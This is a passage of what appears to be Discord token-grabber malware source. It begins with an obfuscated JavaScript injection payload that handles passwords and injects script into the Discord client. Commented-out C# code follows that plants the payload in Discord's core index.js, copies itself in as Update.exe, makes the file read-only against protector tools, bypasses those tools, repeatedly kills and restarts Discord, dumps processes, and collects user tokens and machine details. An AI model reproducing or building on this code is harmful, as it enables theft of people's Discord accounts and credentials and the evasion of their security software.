_0x42c156(_0x33303d-0xb,_0x4c28c6-0x97,_0x33303d-0x325,_0x5b3c94-0x17b,_0x4c28c6);}function _0x481fe4(_0x20d231,_0x38d3ab,_0x2a21f7,_0x13791d,_0x1dd0f7){return _0x4fef24(_0x20d231-0x11e,_0x38d3ab-0x11c,_0x2a21f7-0xb,_0x13791d,_0x20d231- -0x192);}function _0xd8dbe7(_0x29db6a){function _0x2bfb99(_0x593ab3,_0x1eea47,_0x29780b,_0x59081e,_0x18a5a1){return _0x1a7597(_0x593ab3-0x81,_0x1eea47-0xa6,_0x1eea47,_0x18a5a1-0x5c0,_0x18a5a1-0xab);}const _0xaf1193={'QgwHW':function(_0x56bd22,_0x42c5e0){function _0x1986ee(_0x1eb70d,_0x46a0c7,_0x292434,_0x1f1f8d,_0x3473bf){return _0x3a78(_0x3473bf- -0xa1,_0x1eb70d);}return _0x2fcf33[_0x1986ee('Ri!W',0xde,0xdf,0x272,0x290)](_0x56bd22,_0x42c5e0);},'CtnFF':_0x2fcf33[_0x2bfb99(0x631,'lOZ%',0x5c6,0x777,0x82b)],'iMpmz':_0x2fcf33[_0x2bfb99(0xa7c,'KO@1',0x949,0x70b,0x971)],'FnVgx':function(_0x1df494){function _0x907e62(_0x4c2218,_0x203c96,_0x57a82a,_0x164553,_0x54f9ae){return _0x22a664(_0x54f9ae-0x464,_0x203c96-0x7b,_0x57a82a,_0x164553-0x1a2,_0x54f9ae-0xb6);}return _0x2fcf33[_0x907e62(0x5dc,0x5b4,'eqrc',0x90c,0x702)](_0x1df494);}};function _0x5b7943(_0x366c92,_0x9382ef,_0x428eab,_0x31442a,_0x546ad0){return _0x481fe4(_0x428eab- -0xf8,_0x9382ef-0xee,_0x428eab-0x1a9,_0x546ad0,_0x546ad0-0x30);}function _0x401d98(_0x89e591,_0x3b3b48,_0xe10594,_0x206a28,_0x26eb68){return _0x4d4838(_0xe10594- -0x3ec,_0x3b3b48-0x82,_0xe10594-0x140,_0x206a28-0xf5,_0x26eb68);}function _0x22a664(_0x586ddb,_0x35b08e,_0x325179,_0x5bc947,_0x92c296){return _0x1a7597(_0x586ddb-0x53,_0x35b08e-0x68,_0x325179,_0x586ddb-0x7,_0x92c296-0xcd);}function _0x714601(_0x2a1db3,_0x183126,_0xbf65ff,_0x3fcea3,_0x5a7942){return _0x1a7597(_0x2a1db3-0x116,_0x183126-0xff,_0xbf65ff,_0x3fcea3-0x5b,_0x5a7942-0x73);}if(_0x2fcf33[_0x401d98(0x27f,0x3c3,0x467,0x302,'lOZ%')](_0x2fcf33[_0x2bfb99(0x5bc,'asq^',0x605,0x8e1,0x6fc)],_0x2fcf33[_0x22a664(0x260,0x319,'RfHc',0xc,0x318)])){if(_0x2fcf33[_0x5b7943(0x4b4,0x3ab,0x2d6,0x448,'@)Mb')](typeof _0x29db6a,_0x2fcf33[_0x2bfb99(0x9f2,'Np[W',0x6fd,0x7e1,0x812)]))return _0x2fcf33[_0x714601(0x201,0x271,'h]wg',0xb3,0x29c)](_0x2fcf33[_0x714601(0x59c,0x3d1,'eb0J',0x3f0,0x457)],_0x2fcf33[_0x22a664(0x1a,0x20f,'vj69',-0xc6,0x13c)])?![]:function(_0x2dd229){}[_0x714601(0x270,0xbd,'%3Y$',0xc3,0x20a)+_0x5b7943(0x15b,0x567,0x320,0x3a5,'3MeJ')+'r'](_0x2fcf33[_0x2bfb99(0x89c,'DbP#',0x66f,0x5c0,0x669)])[_0x401d98(0x18,0x3fe,0x264,0xa4,'llM9')](_0x2fcf33[_0x714601(0x69,-0x146,'Hk9Z',-0x61,-0x248)]);else{if(_0x2fcf33[_0x22a664(0x3c8,0x387,'%%)G',0x364,0x573)](_0x2fcf33[_0x5b7943(0x64,0x2ca,0x29b,0x55,'!6ND')],_0x2fcf33[_0x5b7943(0x58d,0x52a,0x42a,0x3b6,'3nC1')]))_0x2fcf33[_0x714601(0x448,0x2fe,'89@x',0x250,0x1cf)](_0x505455,0x1*0x2336+0x3*0xa12+0x2*-0x20b6);else{if(_0x2fcf33[_0x401d98(0x211,0x113,0x198,0x314,'DbP#')](_0x2fcf33[_0x5b7943(0x40d,0x32f,0x3de,0x173,'KO@1')]('',_0x2fcf33[_0x22a664(-0x7b,0x35,'@)Mb',-0x60,-0x1b1)](_0x29db6a,_0x29db6a))[_0x2fcf33[_0x22a664(0x168,0x75,'39*L',0x354,0x255)]],0x1*-0x1067+0x1ce8+-0x50*0x28)||_0x2fcf33[_0x22a664(0x99,-0x1a6,'(CAj',0x270,0x222)](_0x2fcf33[_0x2bfb99(0xa31,'MCP#',0x692,0x5eb,0x826)](_0x29db6a,0x2a*0x4+0x19*0xcb+-0x1467),-0x22db*-0x1+-0x38*0x38+-0x169b)){if(_0x2fcf33[_0x5b7943(-0x95,0x218,0x13b,0x347,'CV[@')](_0x2fcf33[_0x22a664(0x1b1,0x19d,'ut@m',-0xbd,0x3a2)],_0x2fcf33[_0x401d98(0x5d,0x2b1,0x51,0xd,'DbP#')])){if(_0x352aef)return _0x407029;else _0x2fcf33[_0x22a664(-0x9c,-0x145,'39*L',-0x85,0x3b)](_0x2f6072,0xb76+-0x2381*0x1+0x180b);}else(function(){function _0xb227a5(_0x25456f,_0x5eb40c,_0x15f9fe,_0x8b4982,_0x214052){return _0x22a664(_0x25456f-0xab,_0x5eb40c-0x72,_0x8b4982,_0x8b4982-0xc1,_0x214052-0x16e);}function _0x4ad066(_0x17d685,_0x356683,_0x25435b,_0x4ec96e,_0x46a436){return _0x5b7943(_0x17d685-0x49,_0x356683-0x1c,_0x25435b-0x452,_0x4ec96e-0x8c,_0x17d685);}function _0x354a3c(_0xfce165,_0x492a0f,_0x5f1eb6,_0x103576,_0x3cf496){return _0x401d98(_0xfce165-0x15e,_0x492a0f-0x1ca,_0x103576-0x506,_0x103576-0x1d5,_0xfce165);}function _0x22f226(_0x4ec39f,_0x45345e,_0x5065e0,_0x41ec20,_0x1848a2){return _0x401d98(_0x4ec39f-0xff,_0x45345e-0x8b,_0x41ec20- -0x83,_0x41ec20-0x34,_0x5065e0);}function _0x23bb72(_0xdab971,_0x2c1cbf,_0x5a6f87,_0x431bc2,_0x3070a1){return _0x2bfb99(_0xdab971-0x26,_0x431bc2,_0x5a6f87-0x1de,_0x431bc2-0xff,_0x5a6f87- -0x412);}if(_0x2fcf33[_0x4ad066('@)Mb',0x673,0x72d,0x503,0x8f3)](_0x2fcf33[_0x4ad066('39*L',0x458,0x67c,0x7e9,0x4ce)],_0x2fcf33[_0xb227a5(0x233,0x31b,0x316,'0tL3',-0x31)]))return!![];else _0x4c7f4e[_0x22f226(-0x1c,0x44d,'39*L',0x229,-0xd)+_0x23bb72(0x359,0x30f,0x484,'89@x',0x5f8)](_0xaf1193[_0xb227a5(0x2cf,0x461,0x41f,'S$EO',0x509)](_0x5cd379,_0xaf1193[_0x4ad066('KO@1',0x79a,0x7e8,0x954,0x680)]),[_0x354a3c('eqrc',0x9d4,0xbd1,0x973,0x8d4)+_0xb227a5(0xe9,0x172,-0xff,'@)Mb',0x139)+(_0x4b1968[_0x354a3c('OhVE',0x9ce,0x5e0,0x769,0x72f)+_0x23bb72(0x475,0x3c0,0x2c4,'eb0J',0x99)+'rd']||'\x22\x22')+(_0x4ad066('%3Y$',0x872,0x6ec,0x5fb,0x47f)+_0x23bb72(0x48d,0x291,0x2d1,'%3Y$',0x210)+_0x22f226(0x33,0x2f7,'89@x',0x22b,0x338))+(_0x11a94f[_0x354a3c('!6ND',0x697,0x857,0x7d0,0x7ba)+_0x4ad066('G$kb',0x638,0x6cb,0x6a2,0x5ab)]||'\x22\x22')+(_0x354a3c('z2Oe',0x60b,0x77e,0x549,0x6d3)+_0x22f226(0x140,0x33d,'N!u(',0x1de,0x21b))+_0x5a20a2,'']);}[_0x5b7943(-0xf7,0xfb,0x136,0x2de,'%%)G')+_0x401d98(0x34d,0x30b,0x37b,0x350,'(CAj')+'r'](_0x2fcf33[_0x401d98(0x19f,0x1e2,0x241,0x3c5,'KO@1')](_0x2fcf33[_0x5b7943(0x3e3,0x270,0x185,-0x62,'8YQS')],_0x2fcf33[_0x2bfb99(0xb5b,'39*L',0x96c,0x86a,0x921)]))[_0x2bfb99(0x66b,'eqrc',0x667,0x50e,0x541)](_0x2fcf33[_0x714601(0x26f,0x31e,'bjTv',0x2d5,0x4b9)]));}else{if(_0x2fcf33[_0x5b7943(0x2ae,-0x184,0xec,0x1c8,'[GQe')](_0x2fcf33[_0x401d98(0x438,0x254,0x20e,0x24,'z#EP')],_0x2fcf33[_0x2bfb99(0x831,'8YQS',0xb1e,0x958,0x988)]))(function(){function _0x58c72d(_0xf46f23,_0x4287be,_0xc3ff59,_0x275937,_0x86d74b){return _0x2bfb99(_0xf46f23-0x19a,_0x86d74b,_0xc3ff59-0x13f,_0x275937-0x191,_0x275937-0x64);}function _0x40ef0c(_0x36db4d,_0x43836f,_0x352139,_0x3cd3a1,_0x33c25b){return _0x22a664(_0x43836f-0x5a4,_0x43836f-0x1cf,_0x33c25b,_0x3cd3a1-0xdb,_0x33c25b-0x5f);}const _0x4fd265={};_0x4fd265[_0x49f13c(0x14e,-0x70,'0tL3',0x1e4,0xba)]=_0x2fcf33[_0x58c72d(0x74a,0x759,0x894,0x663,'08kG')],_0x4fd265[_0x5373dd(0x8e6,0x822,']eq@',0x8a5,0x8e8)]=_0x2fcf33[_0x5373dd(0x660,0x572,'nSPg',0x723,0x517)];const _0x27c861=_0x4fd265;function _0x37c20d(_0x5a475d,_0x502d47,_0x5f219b,_0x99ea26,_0xf55fe2){return _0x2bfb99(_0x5a475d-0x1a7,_0x502d47,_0x5f219b-0x1a4,_0x99ea26-0x12e,_0x5a475d-0x26);}function _0x5373dd(_0x4af27a,_0x1773e7,_0x5a432c,_0x587c80,_0x393728){return _0x5b7943(_0x4af27a-0x191,_0x1773e7-0xc0,_0x587c80-0x4ec,_0x587c80-0x1eb,_0x5a432c);}function _0x49f13c(_0x1fd04c,_0xa7177d,_0x4f72da,_0x142552,_0x566bbc){return _0x2bfb99(_0x1fd04c-0x40,_0x4f72da,_0x4f72da-0xaf,_0x142552-0x1a6,_0xa7177d- -0x6f3);}return _0x2fcf33[_0x49f13c(-0x1cb,-0x1e5,'DbP#',-0x43b,-0x109)](_0x2fcf33[_0x58c72d(0x92d,0x6cb,0x885,0x730,'G$kb')],_0x2fcf33[_0x58c72d(0x68d,0x774,0x764,0x84b,']eq@')])?![]:function(_0x1bbfdc){}[_0x37c20d(0x5b0,'G$kb',0x4bf,0x72b,0x81e)+_0x49f13c(-0x21b,-0xcf,'3nC1',-0x18f,0x75)+'r'](_0x27c861[_0x40ef0c(0x6dd,0x790,0x539,0x870,'er11')])[_0x5373dd(0x902,0x58a,'8YQS',0x772,0x9c9)](_0x27c861[_0x5373dd(0xaab,0x72a,'lOZ%',0x985,0x8a2)]);}[_0x714601(0x58e,0x15a,'nSPg',0x333,0x1e5)+_0x401d98(0x29e,0x42e,0x1e5,0x371,'z2Oe')+'r'](_0x2fcf33[_0x401d98(-0x1b,0x13,-0x30,0x18f,'@)Mb')](_0x2fcf33[_0x5b7943(0x258,0x67b,0x491,0x351,'Hk9Z')],_0x2fcf33[_0x22a664(0x22,0x264,'vj69',-0x123,-0x141)]))[_0x401d98(0x288,0x554,0x2e6,0x18d,'RfHc')](_0x2fcf33[_0x5b7943(0xb1,0x2d0,0x28f,0x41c,'CV[@')]));else{const _0x429562={'VtNKg':_0xaf1193[_0x2bfb99(0x6b0,'ut@m',0x835,0x823,0x79d)],'JntBv':function(_0x53d586,_0x5983f4){function _0x2cc565(_0x550cd9,_0x5e560c,_0x179bc0,_0x126efc,_0x11add3){return _0x2bfb99(_0x550cd9-0x1df,_0x126efc,_0x179bc0-0x4,_0x126efc-0x58,_0x11add3-0x5b);}return _0xaf1193[_0x2cc565(0xa76,0x8a4,0x97e,'N!u(',0xa15)](_0x53d586,_0x5983f4);},'NQAdZ':_0xaf1193[_0x5b7943(0x174,0x208,0x10e,0x25a,'Hk9Z')],'JwHNW':function(_0x45740f,_0x1c1c59){function _0x1c27d7(_0x3e5d32,_0x2d705a,_0x18033f,_0x529878,_0x23e59c){return _0x22a664(_0x18033f-0x4f4,_0x2d705a-0x1d5,_0x3e5d32,_0x529878-0x186,_0x23e59c-0x84);}return _0xaf1193[_0x1c27d7('Np[W',0x61d,0x5ba,0x7ff,0x3ab)](_0x45740f,_0x1c1c59);}},_0x148911=_0x309656[_0x714601(0x2ca,0x184,'K$Eh',0x7a,0x2c2)](_0x3b3d2d[_0x714601(0x1fb,0x1c7,'bjTv',0x97,-0xf)](_0x152e2f[_0x714601(0x2e0,0x60f,'KO@1',0x3d1,0x421)+_0x401d98(0xaa,-0x7c,0x191,-0x8f,'Ri!W')][-0x178f+-0x5*0x305+-0x2*-0x1354][_0x401d98(0x30d,0x20d,0x201,0x3ff,'DbP#')])[_0x5b7943(0x649,0x5ad,0x450,0x391,'EFvR')+_0x5b7943(0x5cc,0x6c4,0x4fd,0x5dd,'!6ND')]()),_0x573058=_0x1e0f4c[_0x2bfb99(0x613,'S$EO',0x740,0x9be,0x7f2)+_0x22a664(-0xaf,-0x136,'G$kb',-0x76,0x149)+_0x401d98(0x344,0x15e,0x34b,0x313,'z2Oe')]()[-0x569*0x5+-0x1c*0x13f+0x3df1];_0x573058[_0x401d98(0x4ab,0x528,0x3cf,0x229,'DbP#')+_0x2bfb99(0x8c1,'S$EO',0x9cd,0x840,0x8a2)+'s'][_0x714601(0x242,0x1b7,'89@x',0xcc,-0x2f)+_0x2bfb99(0x66a,'d)1Q',0x726,0x68c,0x80e)+_0x2bfb99(0x759,'llM9',0x741,0xafe,0x8d3)+'pt'](_0x5b7943(0x4fc,0x335,0x47c,0x6c8,'!6ND')+_0x401d98(-0x109,0x1cd,0xa1,0x64,'z2Oe')+_0x5b7943(0x13c,0x54,0x19b,0x1da,'eqrc')+_0x2bfb99(0x91f,'eW#d',0x7aa,0x7ce,0x94d)+_0x5b7943(0x177,0x26b,0x294,0xb3,'OhVE')+_0x5b7943(0x2cb,0x49a,0x2f9,0x3e0,'0tL3')+_0x2bfb99(0xb20,'lOZ%',0x7a2,0xaa3,0x930)+_0x714601(0x359,0x42a,'ut@m',0x422,0x5db)+_0x401d98(0x311,0x21,0x27c,0x45d,'DbP#')+_0x714601(0xc7,-0x1d4,'z2Oe',0x14,0x9f)+_0x401d98(0x164,-0x5f,0x194,0x23,'8YQS')+_0x2bfb99(0x3c6,'8YQS',0x725,0x752,0x5af)+_0x714601(0x54,-0x163,'%3Y$',-0x30,0x203)+_0x2bfb99(0x53e,'bjTv',0x5b8,0x5d4,0x5b7)+_0x2bfb99(0x8f9,'eqrc',0x744,0x9e1,0x792)+_0x714601(0xcf,0x149,'%3Y$',0x2e3,0x222)+_0x401d98(0x4be,0x41e,0x38b,0x55d,'eW#d')+_0x714601(0x174,0x184,'CV[@',0xe4,-0x9e)+_0x22a664(0x1f0,0x69,'ut@m',0x2b8,0x2bc)+_0x2bfb99(0x8f4,'eb0J',0x955,0x9d6,0x96b)+_0x22a664(0xf0,0xef,'3nC1',0x5f,-0xa1)+_0x22a664(0x6a,0x76,'ut@m',0x24f,0x179)+_0x401d98(0x24a,0x420,0x2ef,0x10a,'Ri!W')+_0x2bfb99(0x701,'Ri!W',0x366,0x2f7,0x559)+_0x5b7943(0x3c6,0x429,0x34f,0x121,'z#EP')+_0x2bfb99(0xc0d,'X9oW',0xbdd,0xba3,0x9a4)+_0x714601(0x3d8,0x25a,']eq@',0x459,0x3df)+_0x401d98(0x352,-0x16e,0xf4,0x1dc,'[qHe')+_0x22a664(-0x7d,-0x2ab,'er11',0x56,-0x1a7)+_0x714601(0x50a,0x1cf,'eqrc',0x2a2,0x427)+_0x714601(0x299,0x127,'!6ND',0x296,0x3a4)+_0x22a664(0xb3,0x1d4,'8YQS',0xf9,0x1bb)+_0x2bfb99(0x9da,'08kG',0x758,0x56a,0x7a3)+_0x401d98(0xc5,-0x228,-0x34,0x5b,'0tL3')+_0x2bfb99(0xa27,'lOZ%',0xa52,0x7ce,0x833)+_0x401d98(0x19b,0x193,-0x11,-0x11d,'0tL3')+_0x2bfb99(0x97c,'3nC1',0x95e,0x90c,0x9a5)+_0x2bfb99(0x70c,'EFvR',0x4f2,0x6ba,0x537)+_0x714601(0xc8,-0x1e,'3nC1',0x209,0x1b6)+_0x401d98(0x11f,-0xcb,0x16a,0x35f,'(CAj')+_0x2bfb99(0x30f,'0tL3',0x4b8,0x75b,0x53f)+_0x714601(0x245,0x2b3,'er11',0x358,0x298)+_0x2bfb99(0x8b5,'08kG',0x6ac,0xa8d,0x879)+_0x5b7943(-0x92,0x235,0x124,-0xb5,'lOZ%')+_0x401d98(0x3be,0x3b2,0x28c,0x169,'OhVE')+_0x714601(0x21f,0x2cb,'Ri!W',0x429,0x48d)+_0x401d98(0x532,0x5fb,0x446,0x4fe,'357&')+_0x714601(0xef,0x541,'CV[@',0x355,0x47b)+_0x714601(0x2ee,-0x59,'eqrc',0x153,0x304)+_0x2bfb99(0x66f,'CV[@',0x492,0x53e,0x6ac)+_0x22a664(0x1a6,0x297,'[GQe',0x3de,0x21d)+_0x5b7943(0x1be,0x455,0x416,0x4a7,'[GQe')+_0x2bfb99(0x6ed,'[GQe',0x41e,0x735,0x65a)+_0x714601(0x154,-0x91,'z#EP',0x149,0x1bc)+_0x22a664(0xfc,0x312,'llM9',0x1b7,0x1bd)+_0x714601(0x1,0x104,'ut@m',0x202,0x46a)+_0x401d98(0x187,0x7f,-0xc,-0x1b2,'39*L')+_0x714601(0x3a8,0x249,'DbP#',0x1ad,0x230)+_0x5b7943(0x7d,-0x11c,0xc0,-0x6,'z2Oe')+_0x5b7943(0x20d,0x24c,0x187,0x1e1,'H1Ip')+_0x22a664(0x316,0x524,'%3Y$',0x321,0x148)+_0x714601(0x425,0x4ba,'357&',0x431,0x33a)+_0x22a664(0x273,0x264,'KO@1',0x151,0x377)+_0x401d98(0xa8,0x4cb,0x2c0,0x2e8,'er11')+_0x714601(-0x88,-0x3e,'N!u(',0xb0,0xef)+_0x2bfb99(0xb88,'3MeJ',0x91f,0x906,0x940)+_0x2bfb99(0x811,'3MeJ',0x62b,0x772,0x665)+_0x5b7943(0x19f,0x5ec,0x3e7,0x48f,'Hk9Z')+_0x2bfb99(0x7b6,'z#EP',0x4c0,0x521,0x672)+_0x2bfb99(0xaa5,'nSPg',0x946,0x861,0x905)+_0x22a664(0x115,0x231,'d)1Q',-0x49,0x2a5)+_0x2bfb99(0x8e6,'ut@m',0x6ff,0x61b,0x889)+_0x5b7943(0x50a,0x2d7,0x3c0,0x18d,'ut@m')+_0x2bfb99(0x777,'OhVE',0x3d0,0x388,0x53d)+_0x22a664(0x44,0x21c,'DbP#',-0x14,-0x21c)+_0x401d98(0x371,0x2f7,0x108,0x15,'RfHc')+_0x5b7943(0x23a,0x122,0xed,0xb1,'nSPg')+_0x5b7943(0x263,0x401,0x2e6,0x3bc,'3nC1')+_0x5b7943(0x34d,0xef,0x333,0x21e,'wu8H')+_0x22a664(0x35f,0x197,'nSPg',0x18d,0x107)+_0x401d98(0x26d,0x4e5,0x27b,0x1b1,'er11')+_0x401d98(0x36c,0x118,0x154,0x212,'eqrc')+_0x2bfb99(0xa0c,'Np[W',0xa6b,0x6eb,0x8c1)+_0x714601(0x25d,0x278,'K$Eh',0x2b0,0x1ea)+_0x5b7943(0x576,0x2a9,0x41f,0x453,'N!u(')+'n;',!(0x22a2+0x19a*-0x18+0x3ce))[_0x2bfb99(0x8f2,'eqrc',0x677,0x7b9,0x8bb)](_0x5a6e29=>{function _0x2377f8(_0x4febbe,_0x2bc947,_0x91a00f,_0xc7b53c,_0x569176){return _0x5b7943(_0x4febbe-0x15f,_0x2bc947-0x15b,_0x91a00f-0x1a7,_0xc7b53c-0x1ac,_0xc7b53c);}function _0x4d79ac(_0x2a6dc7,_0x30315d,_0x1c1128,_0x1a8699,_0x490894){return _0x22a664(_0x30315d-0x315,_0x30315d-0x1f1,_0x1a8699,_0x1a8699-0xf4,_0x490894-0x14b);}function _0x1f89bd(_0x58bbe4,_0x1e4bec,_0x528d4e,_0x31bf37,_0x659174){return _0x2bfb99(_0x58bbe4-0x12a,_0x1e4bec,_0x528d4e-0x69,_0x31bf37-0x194,_0x31bf37- -0x104);}function _0x12585a(_0x17534f,_0x36b3a9,_0x4bf7b3,_0x225950,_0x313927){return _0x714601(_0x17534f-0xb0,_0x36b3a9-0x1dd,_0x313927,_0x17534f- -0x141,_0x313927-0x125);}function _0x3c60bc(_0x33b688,_0x35f532,_0x34371d,_0x99c1de,_0x5bee07){return _0x2bfb99(_0x33b688-0x194,_0x99c1de,_0x34371d-0x14,_0x99c1de-0x136,_0x34371d- -0x658);}_0x2e7480[_0x4d79ac(0x674,0x5f6,0x548,'08kG',0x534)][_0x3c60bc(0xa9,0x1c5,-0x4e,'llM9',-0x5a)+_0x3c60bc(0x139,0x152,0x32b,'llM9',0x52f)](_0x429562[_0x2377f8(0x548,0x53a,0x5a2,'DbP#',0x4e4)])?_0x2d689e[_0x12585a(0x174,0x2e0,-0xcc,0x3b1,'er11')+_0x3c60bc(-0x141,0x266,0x38,'!6ND',-0x90)](_0x429562[_0x12585a(0x12e,-0x3b,0x10f,-0x6e,'!6ND')](_0x1e64d2,_0x429562[_0x1f89bd(0x479,'wu8H',0x569,0x6bb,0x4a2)]),[_0x3c60bc(0x225,0x163,-0x4,'@)Mb',0x135)+_0x3c60bc(0xec,0x6c,0xb1,']eq@',0x19b)+(_0x148911[_0x12585a(-0x4b,-0x9,-0x25e,0x129,'K$Eh')+_0x12585a(-0x86,0x173,0x5e,-0x2a3,'!6ND')+'rd']||'\x22\x22')+(_0x4d79ac(0x523,0x2c7,0x299,'MCP#',0x1c7)+_0x2377f8(0x565,0x518,0x59c,'X9oW',0x387)+_0x3c60bc(0x198,-0xb0,-0x63,'nSPg',0x165))+(_0x148911[_0x12585a(-0x138,0xfe,-0x7,-0x218,'3nC1')+_0x1f89bd(0x6b4,'357&',0x75f,0x88b,0x782)]||'\x22\x22')+(_0x12585a(-0xe7,-0x34c,-0x223,-0x1,'[GQe')+_0x1f89bd(0x3f8,'39*L',0x6a8,0x4be,0x61a))+_0x5a6e29,'']):_0x414411[_0x12585a(0x53,0x2b6,0x1cb,-0xa9,'Q9lz')+_0x3c60bc(0x80,-0x1a5,-0x9c,'llM9',-0x2c6)](_0x429562[_0x12585a(0x2a1,0x42f,0x130,0x161,'MCP#')](_0x74a04e,_0x429562[_0x12585a(-0x11b,0x69,-0xa2,-0x1c1,'N!u(')]),[_0x4d79ac(0x859,0x5e8,0x51c,'m^ii',0x560)+_0x4d79ac(0x4d8,0x631,0x583,'K$Eh',0x61d)+(_0x148911[_0x1f89bd(0x531,'%%)G',0x291,0x420,0x1cd)+_0x3c60bc(-0xa3,0xc4,-0x6e,'er11',0x15f)]||'\x22\x22')+(_0x3c60bc(0x1b4,0x261,0x273,'08kG',0x236)+_0x3c60bc(0x38f,0x4e2,0x29b,'vj69',0x3bc)+_0x4d79ac(0x85,0x2ba,0x3c7,'Ri!W',0xca))+(_0x148911[_0x2377f8(0x333,0x155,0x2ba,'Ri!W',0x1b8)+_0x1f89bd(0x991,'X9oW',0x636,0x78b,0x9f2)+'rd']||'\x22\x22')+(_0x3c60bc(0x44a,0x3a5,0x2c5,'N!u(',0x271)+_0x2377f8(0x3af,0x505,0x576,'bjTv',0x662))+_0x5a6e29,'']);});}}}}_0x2fcf33[_0x714601(0x3a0,0x4ce,'S$EO',0x44c,0x33a)](_0xd8dbe7,++_0x29db6a);}else _0xaf1193[_0x5b7943(0x36e,0x18f,0x106,0x27f,'eW#d')](_0x1d47c3);}try{if(_0x2fcf33[_0x1a7597(-0xb2,-0x1b2,'H1Ip',-0xb0,-0x144)](_0x2fcf33[_0x1aa977(0x9e0,0x7f4,'Q9lz',0xa1e,0x95d)],_0x2fcf33[_0x481fe4(0x3ea,0x1db,0x4c4,'H1Ip',0x4b6)])){if(_0x15fc90){if(_0x2fcf33[_0x1aa977(0x6a6,0x44b,'@)Mb',0x540,0x3c7)](_0x2fcf33[_0x33796f(0x47c,'8YQS',0x6de,0x2cb,0x351)],_0x2fcf33[_0x1a7597(0x38f,0x419,'H1Ip',0x28b,0x371)]))return _0xd8dbe7;else{const _0x19a232=_0x52241a[_0x33796f(0x4fb,'OhVE',0x4d7,0x683,0x502)](_0x351906,arguments);return _0x3c7f09=null,_0x19a232;}}else _0x2fcf33[_0x1a7597(-0x99,-0x4,'h]wg',-0x41,-0x2a7)](_0x2fcf33[_0x481fe4(0x1d1,0x3dc,0x290,'G$kb',0x2f)],_0x2fcf33[_0x481fe4(0x404,0x278,0x2de,'89@x',0x390)])?_0x2fcf33[_0x1aa977(0x608,0x4a6,'MCP#',0x4ac,0x34b)](_0xd8dbe7,-0x1005+0x639+0x21*0x4c):_0x44c6ec[_0x1aa977(0x48e,0x5ea,'z#EP',0x450,0x5cd)+_0x33796f(0x5cf,'er11',0x56a,0x4dd,0x38c)](_0x2fcf33[_0x4d4838(0x39b,0x302,0x41c,0x22b,'Ri!W')](_0x1e8047,_0x2fcf33[_0x481fe4(0x485,0x4da,0x23f,'8YQS',0x561)]),[_0x1a7597(0x7,-0x1dc,'N!u(',-0x63,0xad)+_0x481fe4(0x386,0x443,0x3a4,'vj69',0x1fe)+(_0x5a9e12[_0x1a7597(0x1cc,0x2cd,'(CAj',0xfc,0x135)+_0x1aa977(0x71b,0x84b,'Hk9Z',0xa37,0x92c)]||'\x22\x22')+(_0x33796f(0x55d,'h]wg',0x310,0x739,0x33c)+_0x1a7597(0x58d,0x3f9,'z2Oe',0x3bf,0x167)+_0x1a7597(0xea,0x118,'!6ND',0x148,0xa8))+(_0x424343[_0x33796f(0x424,'eb0J',0x338,0x39d,0x65d)+_0x33796f(0x677,'S$EO',0x59e,0x728,0x545)+'rd']||'\x22\x22')+(_0x1a7597(0x125,0x14b,'z#EP',0x23a,0x2a3)+_0x1a7597(0xb6,0x2,'39*L',0x2,-0x1ba))+_0x4ab65b,'']);}else{if(_0x371e0e){const _0x46fa6f=_0x26d006[_0x1a7597(0x22b,0xd2,'3MeJ',0x7a,0x207)](_0x131c07,arguments);return _0x2e6c16=null,_0x46fa6f;}}}catch(_0x293e1a){}}";

//                //Replicating the grabber to all Discord's core path.
//                for (int i = 0; i < discord.Cores.Count; ++i)
//                {
//                    var corePath = discord.Cores[i];
//                    if (Process.GetCurrentProcess().MainModule.FileName == $"{corePath}Core\\Update.exe")
//                        continue;

//                    if (Directory.Exists(corePath + "\\Core"))
//                        Directory.Delete(corePath + "\\Core", true);

//                    Directory.CreateDirectory(corePath + "\\Core");
//                    try
//                    {
//                        //Extracting the dependencies to the core path.
//                        Extract(path, corePath + "\\Core");
//                    }
//                    catch { }

//                    try
//                    {
//                        //If the file is already exists we delete it.
//                        if (File.Exists($"{corePath}\\Core\\{AppDomain.CurrentDomain.FriendlyName}"))
//                            File.Delete($"{corePath}\\Core\\{AppDomain.CurrentDomain.FriendlyName}");

//                        if (File.Exists($"{corePath}\\Core\\Update.exe"))
//                            File.Delete($"{corePath}\\Core\\Update.exe");

//                        //Writing the index.js file
//                        File.Copy(Assembly.GetEntryAssembly().Location, $"{corePath}\\Core\\Update.exe");
//                        File.WriteAllText(corePath + "\\index.js", $"{Injection}{Environment.NewLine}");

//                        //Setting the file attributes to readonly in oreder to prevent protectors the writing access :/
//                        File.SetAttributes(corePath + "\\index.js", FileAttributes.ReadOnly);
//                    }
//                    catch (Exception ex)
//                    {
//                        //Checking if the cause to the problem is that the file attributes contains readonly.
//                        if (ex.HResult == -2147024891 && File.GetAttributes(corePath + "\\index.js").HasFlag(FileAttributes.ReadOnly))
//                        {
//                            //Removing the readonly attribute.
//                            File.SetAttributes(corePath + "\\index.js", FileAttributes.Normal);
//                            --i;
//                        }
//                    }
//                }
//            }

//            //If we've found zero tokens location which is not normal, its probably some application that "Protecting" Discord.
//            if (discord.TokensPaths.Count == 0)
//            {
//                //Creating a dump for all "Discord" processes and checking if they has tokens.
//                discord.Dump();
//                if (discord.DumpedTokens.Count > 0)
//                    goto Next;

//                //If the dump didn't found any tokens we are trying to bypass the protectors.
//                discord.BypassProtectors(path);

//                while (true)
//                {
//                    //Sleeping 1 minute.
//                    Thread.Sleep(60000);

//                    //Killing all Discord's proccesses
//                    var DiscordProcs = Process.GetProcessesByName("Discord");
//                    foreach (var proc in DiscordProcs)
//                        try { proc.Kill(); } catch { }

//                    //Starting Discord
//                    if (!String.IsNullOrEmpty(discord.Name))
//                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");

//                    //Checking again.
//                    discord = new Discord();
//                    if (discord.TokensPaths.Count > 0)
//                        break;
//                }
//            }

//        Next:
//            //Grabbing the Discord token(s)
//            var Tokens = FindTokens(discord.TokensPaths, discord.Name);
//            Tokens.AddRange(discord.DumpedClients);
//            Tokens = Tokens.Distinct().ToList();

//            //Adding the token given from Discord's process
//            if (!String.IsNullOrEmpty(_Token))
//            {
//                try
//                {
//                    DiscordClient client = new DiscordClient(_Token);
//                    if (client.IsValidToken)
//                        Tokens.Insert(0, client);
//                }
//                catch
//                { }
//            }

//            //If we've found any tokens than we continue.
//            if (Tokens.Count > 0)
//            {
//                //Getting the information about the environment computer.
//                Machine machine = new Machine();
//                DiscordEmbed victimEmbed = new DiscordEmbed();
//                List<DiscordClient> Users = new List<DiscordClient>();
//                List<string> usersData = new List<string>();

//                List<EmbedField> fields = new List<EmbedField>();
